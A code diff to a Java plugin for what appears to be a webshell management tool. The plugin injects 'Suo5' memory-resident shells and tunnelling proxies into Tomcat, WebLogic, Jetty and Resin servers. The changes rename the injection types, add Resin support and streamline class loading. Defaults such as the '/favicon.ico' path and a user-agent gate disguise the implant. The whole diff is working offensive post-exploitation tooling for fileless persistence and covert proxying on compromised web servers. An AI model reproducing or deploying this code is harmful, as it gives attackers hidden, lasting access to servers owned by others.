@@ -21,13 +21,13 @@ import java.io.InputStream;
 
 @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "Suo5MemShell", DisplayName = "Suo5MemShell")
 public class Suo5MemShell implements Plugin {
-    private static final String[] PROXY_TYPE = new String[]{"Suo5Filter", "Suo5Servlet", "Suo5WebLogicFilter", "Suo5JettyFilter"};
+    private static final String[] PROXY_TYPE = new String[]{"Suo5TomcatFilter", "Suo5TomcatServlet", "Suo5WebLogicFilter", "Suo5JettyFilter", "Suo5ResinFilter"};
     private static final String CLASS_NAME = "plugins.Suo5MemShell";
     private final JPanel panel = new JPanel(new BorderLayout());
     private final JLabel urlPatternPassLabel = new JLabel("urlPattern (servletPath): ");
     private final JLabel typeLabel = new JLabel("type: ");
     private final JTextField urlPatternTextField = new JTextField("/favicon.ico", 15);
-    private final JLabel filterNameLabel = new JLabel("filterName (when Suo5Filter): ");
+    private final JLabel filterNameLabel = new JLabel("filterName (when Suo5TomcatFilter): ");
     private final JTextField filterNameTextField = new JTextField("", 15);
     private final JLabel userAgentLabel = new JLabel("user-agent: ");
     private final JTextField userAgentTextField = new JTextField("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3", 20);
@@ -74,31 +74,24 @@ public class Suo5MemShell implements Plugin {
             String urlPattern = this.urlPatternTextField.getText();
             if (urlPattern.length() > 0) {
                 String proxyType = (String) this.typeComboBox.getSelectedItem();
-                String filterName = (String) this.filterNameTextField.getText();
-                String userAgent = (String) this.userAgentTextField.getText();
-                String className;
+                String filterName = this.filterNameTextField.getText();
+                String userAgent = this.userAgentTextField.getText();
                 InputStream inputStream;
+                String className = proxyType;
                 ReqParameter reqParameter = new ReqParameter();
+                reqParameter.add("userAgent", userAgent);
 
-                if (proxyType.equals("Suo5Filter")) {
-                    className = "Suo5Filter";
-                    inputStream = this.getClass().getResourceAsStream("/Suo5Filter.class");
+                if (proxyType.equals("Suo5TomcatFilter")) {
+                    inputStream = this.getClass().getResourceAsStream("/Suo5TomcatFilter.class");
                     reqParameter.add("urlPattern", urlPattern);
                     reqParameter.add("filterName", filterName);
-                } else if (proxyType.equals("Suo5Servlet")) {
-                    className = "Suo5Servlet";
-                    inputStream = this.getClass().getResourceAsStream("/Suo5Servlet.class");
+                } else if (proxyType.equals("Suo5TomcatServlet")) {
+                    inputStream = this.getClass().getResourceAsStream("/Suo5TomcatServlet.class");
                     reqParameter.add("servletPath", urlPattern);
-                } else if (proxyType.equals("Suo5WebLogicFilter")){
-                    className = "Suo5WebLogicFilter";
-                    inputStream = this.getClass().getResourceAsStream("/Suo5WebLogicFilter.class");
-                    reqParameter.add("urlPattern", urlPattern);
                 } else {
-                    className = "Suo5JettyFilter";
-                    inputStream = this.getClass().getResourceAsStream("/Suo5JettyFilter.class");
+                    inputStream = this.getClass().getResourceAsStream(String.format("/%s.class", proxyType));
                     reqParameter.add("urlPattern", urlPattern);
                 }
-                reqParameter.add("userAgent", userAgent);
 
                 byte[] classByteArray = functions.readInputStream(inputStream);
                 inputStream.close();
@@ -108,15 +101,12 @@ public class Suo5MemShell implements Plugin {
                     byte[] result = this.payload.evalFunc(className, "run", reqParameter);
                     String resultString = this.encoding.Decoding(result);
                     Log.log(resultString, new Object[0]);
-                    if (proxyType.equals("Suo5Filter")) {
-                        this.resultTextArea.append(String.format("injecting Suo5Filter, filterName: %s, urlPattern: %s, result: %s\n", filterName.isEmpty()?"[random]":filterName, urlPattern, resultString));
-                    } else if (proxyType.equals("Suo5Servlet")) {
-                        this.resultTextArea.append(String.format("injecting Suo5Servlet, servletPath: %s, result: %s\n", urlPattern, resultString));
-                    } else if (proxyType.equals("Suo5WebLogicFilter")) {
-                        this.resultTextArea.append(String.format("injecting Suo5WebLogicFilter, urlPattern: %s, result: %s\n", urlPattern, resultString));
+                    if (proxyType.equals("Suo5TomcatFilter")) {
+                        this.resultTextArea.append(String.format("injecting Suo5TomcatFilter, filterName: %s, urlPattern: %s, result: %s\n", filterName.isEmpty()?"[random]":filterName, urlPattern, resultString));
+                    } else if (proxyType.equals("Suo5TomcatServlet")) {
+                        this.resultTextArea.append(String.format("injecting Suo5TomcatServlet, servletPath: %s, result: %s\n", urlPattern, resultString));
                     } else {
-                        this.resultTextArea.append(String.format("injecting Suo5JettyFilter, urlPattern: %s, result: %s\n", urlPattern, resultString));
-
+                        this.resultTextArea.append(String.format("injecting %s, urlPattern: %s, result: %s\n", proxyType, urlPattern, resultString));
                     }
                     this.resultTextArea.append(String.format("user-agent: %s\n", userAgent));
                     GOptionPane.showMessageDialog(this.panel, "ok", "提示", 1);
